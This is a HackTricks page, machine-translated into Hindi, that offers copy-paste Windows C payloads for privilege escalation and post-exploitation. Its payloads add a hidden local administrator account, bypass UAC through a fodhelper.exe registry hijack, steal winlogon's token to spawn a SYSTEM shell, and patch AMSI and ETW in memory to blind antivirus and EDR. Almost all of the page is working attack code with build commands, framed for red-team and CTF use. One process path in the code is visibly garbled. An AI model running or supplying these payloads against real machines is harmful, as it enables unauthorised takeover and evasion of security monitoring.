# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

यह पृष्ठ **छोटे, आत्म-contained C स्निप्पेट्स** को इकट्ठा करता है जो Windows Local Privilege Escalation या post-exploitation के दौरान सहायक होते हैं। प्रत्येक payload को **कॉपी-पेस्ट के अनुकूल** बनाने के लिए डिज़ाइन किया गया है, केवल Windows API / C runtime की आवश्यकता होती है, और इसे `i686-w64-mingw32-gcc` (x86) या `x86_64-w64-mingw32-gcc` (x64) के साथ संकलित किया जा सकता है।

> ⚠️  ये payloads मानते हैं कि प्रक्रिया के पास कार्रवाई करने के लिए आवश्यक न्यूनतम विशेषाधिकार पहले से ही हैं (जैसे `SeDebugPrivilege`, `SeImpersonatePrivilege`, या UAC बायपास के लिए मध्यम-इंटीग्रिटी संदर्भ)। ये **रेड-टीम या CTF सेटिंग्स** के लिए अभिप्रेत हैं जहां एक भेद्यता का शोषण करने से मनमाना स्थानीय कोड निष्पादन हुआ है।

---

## Add local administrator user
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` रजिस्ट्री हाइजैक (मध्यम → उच्च अखंडता)
जब विश्वसनीय बाइनरी **`fodhelper.exe`** को निष्पादित किया जाता है, तो यह नीचे दिए गए रजिस्ट्री पथ को **`DelegateExecute` क्रिया को फ़िल्टर किए बिना** क्वेरी करता है। उस कुंजी के तहत हमारा कमांड लगाकर, एक हमलावर UAC को *बिना* डिस्क पर फ़ाइल गिराए बायपास कर सकता है।

*`fodhelper.exe` द्वारा क्वेरी किया गया रजिस्ट्री पथ*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
एक न्यूनतम PoC जो एक ऊंचा `cmd.exe` पॉप करता है:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Windows 10 22H2 और Windows 11 23H2 (जुलाई 2025 पैच) पर परीक्षण किया गया। बायपास अभी भी काम करता है क्योंकि Microsoft ने `DelegateExecute` पथ में अनुपस्थित इंटीग्रिटी चेक को ठीक नहीं किया है।*

---

## टोकन डुप्लीकेशन (`SeDebugPrivilege` + `SeImpersonatePrivilege`) के माध्यम से SYSTEM शेल उत्पन्न करें
यदि वर्तमान प्रक्रिया **दोनों** `SeDebug` और `SeImpersonate` विशेषाधिकार रखती है (कई सेवा खातों के लिए सामान्य), तो आप `winlogon.exe` से टोकन चुरा सकते हैं, इसे डुप्लिकेट कर सकते हैं, और एक ऊंचा प्रक्रिया शुरू कर सकते हैं:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
For a deeper explanation of how that works see:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
अधिकांश आधुनिक AV/EDR इंजन **AMSI** और **ETW** पर निर्भर करते हैं ताकि दुर्भावनापूर्ण व्यवहारों की जांच की जा सके। वर्तमान प्रक्रिया के भीतर दोनों इंटरफेस को जल्दी पैच करना स्क्रिप्ट-आधारित पेलोड (जैसे PowerShell, JScript) को स्कैन होने से रोकता है।
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*ऊपर दिया गया पैच प्रक्रिया-स्थानीय है; इसे चलाने के बाद एक नया PowerShell उत्पन्न करना AMSI/ETW निरीक्षण के बिना निष्पादित करेगा।*

---

## संदर्भ
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)

{{#include ../../banners/hacktricks-training.md}}
